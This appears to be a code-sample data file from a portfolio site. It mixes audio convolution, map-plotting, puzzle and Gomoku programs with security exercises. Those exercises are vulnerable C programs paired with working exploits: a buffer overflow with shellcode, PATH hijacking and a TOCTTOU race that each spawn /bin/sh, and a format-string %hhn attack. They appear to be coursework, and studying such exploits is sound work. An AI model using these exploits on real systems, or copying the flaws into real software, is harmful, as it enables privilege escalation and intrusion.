		        wtemp = sin(0.5*theta);
		        wpr = -2.0*wtemp*wtemp;
		        wpi = sin(theta);
		        wr = 1.0;
		        wi = 0.0;
		        for (m=1; m &lt mmax; m += 2) {
		            for (i=m; i &lt= n; i += istep) {
		                j=i+mmax;
		                tempr = wr*nonDiscreteData[j] - wi*nonDiscreteData[j+1];
		                tempi = wr * nonDiscreteData[j+1] + wi*nonDiscreteData[j];

		                nonDiscreteData[j] = nonDiscreteData[i] - tempr;
		                nonDiscreteData[j+1] = nonDiscreteData[i+1] - tempi;
		                nonDiscreteData[i] += tempr;
		                nonDiscreteData[i+1] += tempi;
		            }
		            wtemp=wr;
		            wr += wr*wpr - wi*wpi;
		            wi += wi*wpr + wtemp*wpi;
		        }
		        mmax=istep;
		    }
		}

		void makeNewWAV(char* outputWAV){

		    int size = dryWav-&gtsigSize + pulseWav-&gtsigSize - 1;
		    short* outSig = new short[size];
		    double* toConvolve = new double[size];
		    double* dryConvolve = new double[dryWav-&gtsigSize];
		    double* pulseConvolve = new double[pulseWav-&gtsigSize];

		    for(int i = 0; i &lt dryWav-&gt sigSize; i++){
		        dryConvolve[i] = (double) dryWav-&gtsignal[i] / 32678.0;
		        //dryConvolve[i] = dryWav-&gtsignal[i] &lt&lt 15;
		    }
		    for(int i = 0; i &lt pulseWav-&gt sigSize; i++){
		        pulseConvolve[i] = ((double)pulseWav-&gtsignal[i]/(double)32678.0);
		        //pulseConvolve[i] = pulseWav-&gtsignal[i] &lt&lt 15;
		    }
		    printf("Performing convolution...\\n");
		    convolution(dryConvolve, dryWav-&gtsigSize, pulseConvolve, pulseWav-&gtsigSize, toConvolve, size);
		    printf("Convolution successful...\\n");
		    double dryMax = 0.0;
		    double sigMax = 0.0;

		    //check for max value in both original and output signals
		    for(int i = 0; i &lt size; i++){
		        if(dryWav-&gtsignal[i] &gt dryMax)
		            dryMax = dryWav-&gtsignal[i];
		        if(toConvolve[i] &gt sigMax)
		            sigMax = toConvolve[i];
		    }
		    for(int i  = 0; i &lt size; i++){
		        toConvolve[i] = toConvolve[i] / sigMax * dryMax;
		    }


		    for(int i = 0; i &lt size; i++){
		        outSig[i] = static_cast&ltshort&gt(toConvolve[i]);
		    }
		    printf("Writing data to file...\\n");
		    FILE* myNewWave = fopen(outputWAV, "wb");

		    fputs("RIFF", myNewWave);
		    unsigned char charFourArray[4];
		    unsigned char charTwoArray[2];
		    int chunkData = (dryWav-&gtchannels * size * (dryWav-&gtbps/8) + 36);
		    charFourArray[3] = (unsigned char)((chunkData &gt&gt 24) & 0xFF);
		    charFourArray[2] = (unsigned char)((chunkData &gt&gt 16) & 0xFF);
		    charFourArray[1] = (unsigned char)((chunkData &gt&gt 8) & 0xFF);
		    charFourArray[0] = (unsigned char)(chunkData & 0xFF);
		    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
		    fputs("WAVE", myNewWave);
		    fputs("fmt ", myNewWave);

		    charFourArray[3] = (unsigned char)((16 &gt&gt 24) & 0xFF);
		    charFourArray[2] = (unsigned char)((16 &gt&gt 16) & 0xFF);
		    charFourArray[1] = (unsigned char)((16 &gt&gt 8) & 0xFF);
		    charFourArray[0] = (unsigned char)(16 & 0xFF);
		    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);

		    charTwoArray[1] = (unsigned char)((1 &gt&gt 8) & 0xFF);
		    charTwoArray[0] = (unsigned char)(1 & 0xFF);
		    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);

		    charTwoArray[1] = (unsigned char)((dryWav-&gtchannels &gt&gt 8) & 0xFF);
		    charTwoArray[0] = (unsigned char)(dryWav-&gtchannels & 0xFF);
		    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);

		    charFourArray[3] = (unsigned char)((dryWav-&gtsample &gt&gt 24) & 0xFF);
		    charFourArray[2] = (unsigned char)((dryWav-&gtsample &gt&gt 16) & 0xFF);
		    charFourArray[1] = (unsigned char)((dryWav-&gtsample &gt&gt 8) & 0xFF);
		    charFourArray[0] = (unsigned char)(dryWav-&gtsample & 0xFF);
		    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);

		    charFourArray[3] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 24) & 0xFF);
		    charFourArray[2] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 16) & 0xFF);
		    charFourArray[1] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 8) & 0xFF);
		    charFourArray[0] = (unsigned char)(dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample & 0xFF);
		    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);

		    charTwoArray[1] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) &gt&gt 8) & 0xFF);
		    charTwoArray[0] = (unsigned char)(dryWav-&gtchannels * (dryWav-&gtbps/8) & 0xFF);
		    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);

		    charTwoArray[1] = (unsigned char)((dryWav-&gtbps &gt&gt 8) & 0xFF);
		    charTwoArray[0] = (unsigned char)((dryWav-&gtbps) & 0xFF);
		    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);

		    fputs("data", myNewWave);

		    charFourArray[3] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 24) & 0xFF);
		    charFourArray[2] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 16) & 0xFF);
		    charFourArray[1] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 8) & 0xFF);
		    charFourArray[0] = (unsigned char)((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) & 0xFF);
		    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);

		    for(int i = 0; i &lt size; i++){
		        charTwoArray[1] = static_cast&ltunsigned char&gt((outSig[i] &gt&gt 8) & 0xFF);
		        charTwoArray[0] = (unsigned char) (outSig[i] & 0xFF);
		        fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
		    }
		    fclose(myNewWave);
		    printf("File created successfully...\\n");
		}

		void convolution(double* inputSignal, int inputSize, double* irSignal, int irSize, double* outputSignal, int outputSize) {
		    int n,m;

		    if(outputSize != (inputSize + irSize - 1)){
		        printf("Signal is of wrong size. Exiting now");
		        exit(EXIT_FAILURE);
		    }

		    for(n = 0; n &lt outputSize; n++){
		        outputSignal[n] = 0.0;
		    }

		    for(n = 0; n &lt inputSize; n++){
		        for(m = 0; m &lt irSize; m++){
		            outputSignal[n+m] += inputSignal[n] * irSignal[m];
		        }
		        if(n == (inputSize/10)){
		            printf("\\tConvolution at 10 percent...\\n");
		            fflush(stdout);
		        }
		        else if(n == (2*inputSize/10)){
		            printf("\\tConvolution at 20 percent...\\n");
		            fflush(stdout);
		        }
		        else if(n == (3*inputSize/10)){
		            printf("\\tConvolution at 30 percent...\\n");
		            fflush(stdout);
		        }
		        else if(n == (4*inputSize/10)){
		            printf("\\tConvolution at 40 percent...\\n");
		            fflush(stdout);
		        }
		        else if(n == (5*inputSize/10)){
		            printf("\\tConvolution at 50 percent...\\n");
		            fflush(stdout);
		        }
		        else if(n == (6*inputSize/10)){
		            printf("\\tConvolution at 60 percent...\\n");
		            fflush(stdout);
		        }
		        else if(n == (7*inputSize/10)){
		            printf("\\tConvolution at 70 percent...\\n");
		            fflush(stdout);
		        }
		        else if(n == (8*inputSize/10)){
		            printf("\\tConvolution at 80 percent...\\n");
		            fflush(stdout);
		        }
		        else if(n == (9*inputSize/10)){
		            printf("\\tConvolution at 90 percent...\\n");
		            fflush(stdout);
		        }
		    }
		}

		bool isWave(char* file) {
		    char* pos = strrchr(file, '.');
		    return strcmp(pos, ".wav") == 0;
		}`
	},
	bof: {
		type: 'c',
		code: `
		#include <stdio.h>     // printf, fopen, fread, FILE, stderr
		#include <string.h>    // memcpy
		#include "shellcode.h" // x86-64 shellcode

		int main(int argc, char * argv[])
		{
		    char buffer[256];
		    char str[256+32];
		    FILE * boffile = fopen("boffile", "r");
		    printf(" %p \\n", &buffer[0]);
		    printf(" %p \\n", &str[0]);
		    if (boffile == NULL)
		    {
		        perror("fopen failed");
		        return 1;
		    }
		    size_t bytes_read = fread(str, sizeof(char), sizeof(str), boffile);
		    if (bytes_read != sizeof(str))
		    {
		        fprintf(stderr, "fread didn't find enough bytes\\n");
		        return 1;
		    }

		    memcpy(buffer, str, sizeof(str));

		    printf("Returning from main\\n");
		    return 0;
		}`
	},
	sbof: {
		type: 'c',
		code: `
		#include <stdio.h>
		#include <string.h>
		#include <stdlib.h>
		#include <unistd.h>
		#include "shellcode.h"
		int main(){
		    FILE * boffile = fopen("boffile", "w");
		    char buffer[256 + 32];
		    char * pointer;
		    int size = 288;

		    memset(&buffer, 0x90, 288);
		    pointer = buffer + 254 - strlen(shellcode);
		    memcpy(pointer, shellcode, strlen(shellcode));
		    unsigned char retadd[8] = "\x40\xdf\xff\xff\x7f\x00\x00";
		    pointer = buffer + 280;
		    memcpy(pointer, retadd, 8);
		    fwrite(buffer, size, 1, boffile);
		    fclose(boffile);

		    char * argv = {"./bof", NULL};
		    execvp("./bof", argv);

		    return 0;
		}`
	},
	env: {
		type: 'c',
		code: `
		#include <stdio.h>  // printf, fflush
		#include <unistd.h> // execvp

		int main(int argc, char * argv[])
		{
		    if (argc < 2)
		    {
		        printf("Usage: %s message\\n", argv[0]);
		        return 1;
		    }
		    const char * cmd = "echo";
		    printf(" -> Invoking %s: ", cmd);
		    fflush(stdout);

		    char * args[] = { "echo", argv[1], NULL };
		    execvp("echo", args);

		    return 0;
		}`
	},
	senv: {
		type: 'c',
		code: `
		#include <stdio.h>
		#include <string.h>
		#include <stdlib.h>
		#include <unistd.h>
		#include <stddef.h>

		int main(){
		    unlink("./echo");
		    symlink("/bin/sh", "./echo");
		    putenv("PATH=.:/usr/local/bin:/usr/bin:/bin");
		    execl("./env", "env", "-i", NULL);
		    return 0;
		}`
	},
	toc: {
		type: 'c',
		code: `
		#include <sys/stat.h>  // sruct stat, stat
		#include <unistd.h>    // sleep
		#include <stdio.h>     // printf, snprintf, fflush, stdout
		#include <string.h>    // strlen
		#include <stdlib.h>    // system

		int additional_security_checks()
		{
		    printf("Performing security checks...");
		    fflush(stdout);
		    //TODO: Implement this function; for now we pretend to do something
		    //useful.
		    sleep(2);
		    printf("everything looks good! :)\\n");
		    return 0;
		}

		int main(int argc, char ** argv)
		{
		    if (argc < 2)
		    {
		        printf("Usage: %s message\\n", argv[0]);
		        return 1;
		    }

		    char * cmd = "echo";
		    struct stat sb;
		    printf("Checking for local copy of echo...");
		    if (stat(cmd, &sb) == 0) 
		    {
		        printf("local copy present! (Switching to /bin/echo)\\n");
		        cmd = "/bin/echo";
		    }
		    else printf("none present\\n");
		 
		    if (additional_security_checks()) return 1;

		    fflush(stdout);
		    printf(" -> Invoking %s: ", cmd);
		    char * args[] = { cmd, argv[1], NULL };
		    execvp(cmd, args);
		}`
	},
	stoc: {
		type: 'c',
		code: `
		#include <stdio.h>
		#include <string.h>
		#include <stdlib.h>
		#include <unistd.h>
		#include <sys/wait.h>
		#include <stddef.h>

		int main(){
		    if (fork() == 0){
		        unlink("./echo");
		        putenv("PATH=./usr/local/bin:/usr/bin:/bin");
		        execl("./tocttou", "tocttou", "-i", NULL);
		    }
		    else{
		        int status;
		        sleep(1);
		        symlink("/bin/sh", "./echo");
		        wait(&status);
		    }
		    return 0;
		}`
	},
	fmt: {
		type: 'c',
		code: `
		#include <stdlib.h> // malloc, free, system
		#include <string.h> // strchr, strlen
		#include <stdio.h>  // printf, snprintf, fflush

		int main(int argc, char ** argv)
		{
		    if (argc < 2)
		    {
		        printf("Usage: %s message\\n", argv[0]);
		        return 1;
		    }
		    const char * message = argv[1];

		    char * forbidden = malloc(8 * sizeof(char));
		    forbidden[0] = '&';
		    forbidden[1] = '/';
		    forbidden[2] = ';';
		    forbidden[3] = '|';
		    forbidden[4] = '>';
		    forbidden[5] = '<';
		    forbidden[6] = "";
		    forbidden[7] = '$';
		    forbidden[8] = '\#';

		    printf("Checking ");
		    printf(message);
		    printf(" for forbidden chars...");

		    for (int i = 0; i < 7; ++i)
		    {
		        if (strchr(message, forbidden[i]))
		        {
		            printf("ABORT: found '%c'\\n", forbidden[i]);
		            free(forbidden);
		            return 1;
		        }
		    }
		    printf("looks safe to me!\\n");

		    const char * prefix = "/bin/echo";
		    printf(" -> Invoking %s: ", prefix);
		    fflush(stdout);
		    char echocmd[strlen(prefix)+1+strlen(message)+1];
		    snprintf(echocmd, sizeof(echocmd), "%s %s", prefix, message);
		    system(echocmd);

		    free(forbidden);

		    return 0;
		}`
	},
	sfmt: {
		type: 'c',
		code: `
		#include <stdio.h>  // fprintf
		#include <unistd.h> // execl
		#include <stdlib.h> // system

		int main(int argc, char * argv[])
		{
		    const char *find_n =
		        "exec 2>/dev/null;"  //\`seq 40\`; do"
		        "  if ./format %\${i}\\$s | grep -qF '\\"&'; then"
		        "    /bin/echo -n $i >forbidden.txt;"
		        "    break;"
		        "  fi;"
		        "done";     

		    unlink("forbidden.txt");
		    system(find_n);

		    FILE *f;

		    if (!(f = fopen("forbidden.txt", "r"))) {
		        fprintf(stderr, "Could not determine position of forbidden in stack.\\n");
		        return 1;
		    }

		    char n[10] = {0};
		    char message[256];

		    fread(n, 1, sizeof n - 1, f);
		    snprintf(message, sizeof message, ".%%%s$hhn & sh", n);

		    fprintf(stderr, "n is '%s'; message will be: \\"%s\\"\\n", n, message);
		    puts("Press ENTER if the shell prompt does not immediately appear");

		    execl("./format", "format", message, NULL);
		    return 0;
		}`
	},
	gmc: {
		type: 'python',
		code: `
		import SimpleGraphics as sg
		import sys
		import io

		width = 1022
		height = 620
		startVert = 95
		endVert = 50
		startHor = 35
		endHor = 10
		gap = 5
		def drawMap(plotList,startVert,endVert,startHor,endHor,width,height):
		  image = sg.loadImage("map.gif")
		  sg.resize(width, height)
		  sg.drawImage(image, 0, 0)
		  counterVert = (startVert - endVert) / gap
		  dividerVert = width / (counterVert)
		  counterHor = (startHor - endHor) / gap
		  dividerHor = height / (counterHor)
		  j = 0
		  sg.textWidth(20)
		  sg.setColor("White")
		  while (startVert &gt endVert):
		      sg.line(dividerVert * j, 0, dividerVert * j, height)
		      toWrite = str(startVert) + "W"
		      sg.text((dividerVert * j) + 15, 10, toWrite)
		      j = j + 1
		      startVert = startVert - 5
		  j = 0
		  while (startHor &gt endHor):
		      sg.line(0, dividerHor * j, width, dividerHor * j)
		      toWrite = str(startHor) + "N"
		      sg.text(15, (dividerHor * j) - 10, toWrite)
		      j = j + 1
		      startHor = startHor - 5
		  getInput(plotList,dividerVert,dividerHor)
		def getInput(plotList,dividerVert,dividerHor):
		  factorHor = (dividerVert / gap)
		  factorVert = (dividerHor / gap)
		  #Every 5 pixels represents 127.75 pixels in frame so then 1 pixel in frame is 22.71 across and 24.8 down
		  print(factorHor,factorVert)
		  sg.setColor("Grey")
		  if(len(plotList) &gt 0):
		      counter = 0
		      while(counter < len(plotList)):
		          latitude = abs(plotList[counter])
		          if(latitude == 0):
		              return
		          longitude = abs(plotList[counter+1])
		          windspeed = plotList[counter+2]
		          print(latitude,longitude)
		          longitude = (longitude / (startHor-endHor)) * factorVert
		          latitude = (latitude / (startHor-endHor)) * factorHor
		          sg.ellipse(longitude,latitude,5,5)
		          counter = counter + 3
		      return
		  else:
		      latitude = float(input("Please enter the Latitude of the hurricane you wish to plot: "))
		      if(latitude == 0):
		          return
		      longitude = abs(float(input("Please enter the Longitude of the hurricane you wish to plot: ")))
		      windspeed = input("HOW FAST IS THE WIND")
		      sg.ellipse(latitude, longitude, 5,  5)
		  getInput(plotList,dividerVert,dividerHor)
		def main():
		  plotList = []
		  if(len(sys.argv) &gt 1):
		      file = open(sys.argv[1],"r")
		      plotList = file.readlines()
		      for i in range(len(plotList)):
		          plotList[i] = plotList[i].replace("\\n","")
		          plotList[i] = float(plotList[i])
		  drawMap(plotList,startVert,endVert,startHor,endHor,width,height)
		if __name__ == "__main__":
		  main()`
	},
	gmg: {
		type: 'python',
		code: `
		import SimpleGraphics as sg
		import os, time

		def makeFold(dir):
		  try:
		      if not os.path.exists(dir):
		          os.makedirs(dir)
		  except OSError:
		      with open("ERROR.txt",'w') as err:
		          err.write("This path attempt at: " + str(time.time()) + " in the OS does not exist")

		def flood(x, y,image,w,h,old):
		  toGo = []
		  stack = [(x, y)]
		  while len(stack) &gt 0:
		      x, y = stack.pop()
		      if sg.getPixel(image,x,y) != old and x &gt 0 and x &lt w-1 and y &gt 0 and y &lt h-1:
		          if sg.getPixel(image,x+1,y) != old:
		              toGo.append([x+1,y,sg.getPixel(image,x+1,y)])
		          if sg.getPixel(image, x - 1, y) != old:
		              toGo.append([x-1,y,sg.getPixel(image,x-1,y)])
		          if sg.getPixel(image, x, y+1) != old:
		              toGo.append([x,y+1,sg.getPixel(image,x,y+1)])
		          if sg.getPixel(image, x, y-1) != old:
		              toGo.append([x,y-1,sg.getPixel(image,x,y-1)])
		          sg.putPixel(image, x, y, old[0], old[1], old[2])
		          stack.append((x + 1, y))
		          stack.append((x - 1, y))
		          stack.append((x, y + 1))
		          stack.append((x, y - 1))
		  return toGo

		def main():
		  fname = input("What is the file you wish to open? e.g. DogPuzzle.ppm\\n\\n")
		  image = sg.loadImage(fname)
		  w = sg.getWidth(image)
		  h = sg.getHeight(image)
		  sg.drawImage(image,0,0)
		  sg.resize(w,h)
		  fcount = 0
		  makeFold("./PuzzlePieces/")
		  input1 = input("What color is the border of the puzzle pieces? Please enter in space sperated values\\n\\n")
		  old = tuple(int(x) for x in input1.split())
		  totalimage = []
		  while not sg.closed():
		      me = sg.getMouseEvent()
		      if me != None:
		          (me, (x,y)) = me
		      else:
		          me = ""
		      if me == "&ltButton-1&gt":
		          if x &lt 0 or y &lt 0:
		              print("Please try and click inside the picture")
		          elif x &gt w or y &gt h:
		              print("I knew you were never good at coloring in the lines")
		          else:
		              piece = flood(x,y,image,w,h,old)
		              sg.drawImage(image,0,0)
		              img = sg.createImage(w,h)
		              filename = "./PuzzlePieces/Puzzle"
		              for pixel in piece:
		                  totalimage.append(pixel)
		              for pixel in totalimage:
		                  sg.putPixel(img,pixel[0],pixel[1],pixel[2][0],pixel[2][1],pixel[2][2])
		              sg.saveGIF(img,filename)
		if __name__ == "__main__":
		  main()`
	},
	gml: {
		type: 'python',
		code: `
		import os
		from gomoku_GUI import Visuals
		from gomoku_Logic import Logic


		#&gt Initiates game setup and enters mainloop(), which does not end until game close.
		def main():
		  os.system('cls' if os.name == 'nt' else 'clear') #Clears the terminal window

		  #&gt Initializes the Visuals and Logic instances which will be used throughout.
		  graphics = Visuals()
		  game = Logic()

		  #&gt Places a reference to the instance of the other class in each instance.
		  game.graphics = graphics
		  graphics.game = game

		  graphics.setupBindings()

		  #&gt First game prep. Must be outside of __init__ in Visuals since it depends
		  #  on variables set during __init__ in Logic.
		  game.cellSize = graphics.BOARDSIZE / game.dimension
		  graphics.drawBoard()
		  if game.player == game.comp: #&gtIf the first player is the computer.
		          game.computerMove()  # then play that before looping.
		  graphics.toggleWelcome()
		  graphics.displayTurn()

		  graphics.win.mainloop() #&gt Loops indefinitely, waiting for click or key input
		main()`
	},
	pyplot: {
		type: 'python',
		code: `
		import turtle

		class Visuals:
		  BOARDSIZE = 630 #Board size, in pixels.
		  OFFSETX = -200
		  OFFSETY = -290

		  #&gt Sets up the space within which the game is played and assigns key bindings.
		  #&gt Registers shapes, such as the background image and game pieces.
		  #&gt Sets up all necessary turtles.
		  def __init__(self):
		      # Initializes the window space.
		      self.win = turtle.Screen()
		      self.win.title("GOMOKU")
		      # Resizes and centers the Turtle window.
		      self.win.setup(width=910,height=710)


		      # Sets up images for use elsewhere
		      images = turtle.getscreen()
		      images.bgpic("background.gif")
		      images.register_shape("welcomeScreen.gif")
		      images.register_shape("helpScreen.gif")
		      images.register_shape("winMessage.gif")
		      images.register_shape("loseMessage.gif")
		      images.register_shape("diffSettings.gif")
		      images.register_shape("diffWarning.gif")
		      images.register_shape("noDiffDisplay.gif")
		      images.register_shape("easyDiffDisplay.gif")
		      images.register_shape("medDiffDisplay.gif")
		      images.register_shape("hardDiffDisplay.gif")

		      # Bugfix to hide the "anonymous" turtle generated by the registered shapes.
		      turtle.getturtle().hideturtle()

		      # Sets all the turtles for play
		      self.turtleBreeder()


		  #&gt Sets up all of the necessary Turtle widow bindings required to process:
		  #  click input (gameplay and buttons),
		  #  keyboard shortcuts (exit, save, load, difficulty, help, welcome)
		  def setupBindings(self):
		      self.win.onclick(self.game.sectionSelector)
		      self.win.onkey(self.game.initializeNewGame,"n")
		      self.win.onkey(exit,"e")
		      self.win.onkey(exit,"x") #&gtSince "x" is so much more "exit" than "e".
		      self.win.onkey(self.game.saveGame,"s")
		      self.win.onkey(self.game.loadGame,"l")
		      self.win.onkey(self.toggleWelcome,"w")
		      self.win.onkey(self.toggleDiffSettings,"d")
		      self.win.onkey(self.disableComp,"0")
		      self.win.onkey(self.toggleHelp,"h")
		      self.win.listen()


		  #&gt Draws the Gomoku board grid and labels each line.
		  #&gt Uses self.lineman, which must already have been initialized.
		  def drawBoard(self):
		      # Sets the animation tracing to an instantaneous mode.
		      self.win.tracer(2)

		      # Draws horizontal lines.
		      # Offsets the starting position to give the board "spokes".
		      gotox = -self.game.cellSize/2 + self.OFFSETX
		      gotoy = 0 + self.OFFSETY
		      self.lineman.setheading(0)
		      for row in range(1,self.game.dimension+1):
		          self.lineman.penup()
		          self.lineman.goto(gotox, gotoy)
		          self.lineman.pendown()
		          self.lineman.write(row,move=False,align="left",font=("Arial",10,"normal"))
		          self.lineman.forward(self.BOARDSIZE)
		          self.lineman.write(row,move=False,align="right",font=("Arial",10,"normal"))
		          gotoy = gotoy + self.game.cellSize #Offsets the y-coord by a grid unit.

		      # Constructs a list containing 'n' capital letters, where n = dimension.
		      upperCase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		      letters = []
		      for let in range(self.game.dimension):
		          letters.append(upperCase[let])

		      # Draws vertical lines.
		      gotox = 0 + self.OFFSETX
		      gotoy = -self.game.cellSize/2 + self.OFFSETY
		      self.lineman.setheading(90)
		      for col in letters:
		          self.lineman.penup()
		          self.lineman.goto(gotox, gotoy-25)
		          self.lineman.write(col,move=False,align="center",font=("Arial",10,"normal"))
		          self.lineman.forward(25)
		          self.lineman.pendown()
		          self.lineman.forward(self.BOARDSIZE)
		          gotox = gotox + self.game.cellSize #Offsets the x-coord by a grid unit.
		          self.lineman.write(col,move=False,align="center",font=("Arial",10,"normal"))

		      # Sets the animation tracing back to normal
		      self.win.tracer(1)


		  #&gt Creates instance-wide turtles to enable so that their stamps
		  #  can be cleared later, which is not possible if they are local.
		  def turtleBreeder(self):
		      # Initializes the turtle which will write the turn number.
		      self.turner = turtle.Turtle()
		      self.turner.hideturtle()
		      self.turner.color('blue')
		      self.turner.penup()
		      self.turner.speed(0)
		      self.turner.goto(-150+self.OFFSETX,340+self.OFFSETY)

		      # Initializes the turtle used to stamp game pieces.
		      self.stamper = turtle.Turtle()
		      self.stamper.hideturtle()
		      self.stamper.shape("circle")
		      self.stamper.speed(0)
		      self.stamper.penup()
		      self.stamper.goto(50+self.OFFSETX,50+self.OFFSETY)

		      # Initializes the turtle which draws the grid.
		      self.lineman = turtle.Turtle()
		      self.lineman.hideturtle()
		      self.lineman.color("white")
		      self.lineman.width(2)

		      # Initializes the turtle which writes messages in the game window.
		      self.messenger = turtle.Turtle()
		      self.messenger.hideturtle()
		      self.messenger.color("white")
		      self.messenger.speed(0)
		      self.messenger.penup()
		      self.messenger.goto(-245+self.OFFSETX, 185+self.OFFSETY)

		      # Initializes the turtle which will draw the "win line".
		      self.winMan = turtle.Turtle()
		      self.winMan.hideturtle()
		      self.winMan.color("red")
		      self.winMan.width(5)
		      self.winMan.speed(0)
		      self.winMan.penup()

		      # Initializes the turtle which will display the difficulty level.
		      self.diffDisplayer = turtle.Turtle()
		      self.diffDisplayer.shape("easyDiffDisplay.gif") #Default difficulty

		      # Initializes the turtle which will display a warning message.
		      self.diffWarner = turtle.Turtle()
		      self.diffWarner.hideturtle()
		      self.diffWarner.shape("diffWarning.gif")

		      # Initializes the turtle which will allow user to select difficulty.
		      self.diffSetter = turtle.Turtle()
		      self.diffSetter.hideturtle()
		      self.diffSetter.shape("diffSettings.gif")

		      # Sets up the turtle which displays the intro screen.
		      self.welcomeMan = turtle.Turtle()
		      self.welcomeMan.hideturtle()
		      self.welcomeMan.shape("welcomeScreen.gif")

		      # Sets up the turtle which displays the help screen.
		      self.helpMan = turtle.Turtle()
		      self.helpMan.hideturtle()
		      self.helpMan.shape("helpScreen.gif")

		      # Sets up the turtle which displays the win/lose image.
		      self.resultMan = turtle.Turtle()
		      self.resultMan.hideturtle()


		  #&gt Toggles the welcome screen image. Initial value of game.welcome is "None"
		  #  so that boolean logic can be used.
		  #&gt&gt This enables toggling using key input, which cannot pass parameters.
		  def toggleWelcome(self):
		      if self.game.welcomeVisible:
		          self.welcomeMan.clear()
		          self.game.welcomeVisible = False
		      else:
		          self.welcomeMan.stamp()
		          self.game.welcomeVisible = True


		  #&gt Toggles the help screen image. Works identically to toggleWelcome(),
		  #  except that the initial value of game.help is False, since it shouldn't
		  #  display by default.
		  def toggleHelp(self):
		      if self.game.helpVisible:
		          self.helpMan.clear()
		          self.game.helpVisible = False
		      else:
		          self.helpMan.stamp()
		          self.game.helpVisible = True


		  #&gt Writes the number of turns a player has taken to the message board.
		  def displayTurn(self):
		      self.turner.clear()
		      self.turner.write(self.game.move, move=False,\
		                        align="left", font=("Helvetica", 35, "normal"))

		  
		  #&gt Uses the click x value to determine whether the confirm or cancel buttons
		  #  has been clicked. If the xPos is &lt-165, then the confirm code is executed;
		  #  the new difficulty is set and a new game is begun.
		  def diffConfirmation(self, xPos):
		      self.displayMessage("clear")
		      self.diffWarner.hideturtle()
		      self.game.diffWarnVisible = False

		      if xPos &lt -165:
		          self.game.diff = self.game.newDiff
		          self.displayDiff()
		          self.game.initializeNewGame()


		  #&gt Stamps the image for the current difficulty level in the message box
		  def displayDiff(self):
		      if self.game.diff == 0: # No AI mode; easter egg / debugging
		          self.diffDisplayer.shape("noDiffDisplay.gif")
		      elif self.game.diff == 1:
		          self.diffDisplayer.shape("easyDiffDisplay.gif")
		      elif self.game.diff == 2:
		          self.diffDisplayer.shape("medDiffDisplay.gif")
		      elif self.game.diff == 3:
		          self.diffDisplayer.shape("hardDiffDisplay.gif")

		          
		  #&gt Toggles the "difficulty change warning" which tells the user that their
		  #  current game progress will be lost, and seeks confirmation.
		  #&gt The "set difficulty" prompt is always hidden when this is run.
		  #&gt If the selected difficulty is already set, an error is displayed
		  def toggleDiffWarning(self):
		      self.diffSetter.hideturtle()
		      self.game.diffSetVisible = False

		      if self.game.diffWarnVisible:
		          self.diffWarner.hideturtle()
		          self.game.diffWarnVisible = False

		      elif self.game.newDiff != self.game.diff:
		          self.displayMessage("clear")
		          self.diffWarner.showturtle()
		          self.game.diffWarnVisible = True

		      else:
		          self.displayMessage("That  difficulty\\n  setting  was\\n  already  set!")

		          
		  #&gt Toggles the "set difficulty" prompt, which enables the user to choose
		  #  the difficulty of the next game they play. 
		  def toggleDiffSettings(self):
		      if self.game.diffSetVisible:
		          self.diffSetter.hideturtle()
		          self.game.diffSetVisible = False
		      else:
		          self.displayMessage("clear")
		          self.diffSetter.showturtle()
		          self.game.diffSetVisible = True
		  
		 
		  #&gt This function manages the "easter egg" / debugging functionality of
		  #  disabling the AI so that the computer does not make any moves. 
		  #&gt The only way that this function is invoked is through the keyboard bindings
		  #  assigned to the "0" numerical key.
		  def disableComp(self):
		      if self.game.diff != 0:
		          self.game.diff = 0
		      else:
		          self.game.diff = 2
		      self.displayDiff()
		      
		      
		  #&gt Accepts a string and writes it to the display area left of the game board.
		  #&gt Used to display arbitrary information to the user.
		  def displayMessage(self, message):
		      # Clears anything that could be in the message box.
		      self.messenger.clear()
		      if self.game.diffSetVisible:
		          self.toggleDiffSettings()
		      elif self.game.diffWarnVisible:
		          self.toggleDiffWarning()
		      elif self.game.winState:
		          self.resultMan.clear()

		      if message != "clear":
		          self.messenger.write(message, move=False, \
		                               align="left", font=("Impact", 22, "normal"))


		  #&gt Stamps the current player's game piece at the X and Y coordinates specified
		  def stampPiece(self, posX,posY):
		      if self.game.player == "B":
		          self.stamper.color("black")
		      else:
		          self.stamper.color("white")
		      self.stamper.shapesize(2*(10/self.game.dimension),2*(10/self.game.dimension))
		      self.stamper.goto(posX+self.OFFSETX,posY+self.OFFSETY)
		      self.stamper.stamp()


		  #&gt Draws a line which passes through the 5 winning pieces, and prints a message.
		  #&gt Both parameters are expected to be numerical 2-tuples of form (col, row).
		  def setWin(self, start, end):
		      self.game.winState = True

		      if self.game.player == self.game.human:
		          self.resultMan.shape("winMessage.gif")
		          self.resultMan.stamp()
		      else:
		          self.resultMan.shape("loseMessage.gif")
		          self.resultMan.stamp()

		      #&gt Finds coordinates for start and endpoint of winning play
		      # using tuples passed as parameters
		      xStart = start[0] * self.game.cellSize + self.OFFSETX
		      yStart = start[1] * self.game.cellSize + self.OFFSETY
		      xEnd = end[0] * self.game.cellSize + self.OFFSETX
		      yEnd = end[1] * self.game.cellSize + self.OFFSETY

		      #&gt Draws the win line
		      self.winMan.goto(xStart,yStart)
		      self.winMan.speed(1)
		      self.winMan.pendown()
		      self.winMan.goto(xEnd,yEnd)
		      self.winMan.penup()`
	},
	pypm: {
		type: 'python',
		code: `
		import random

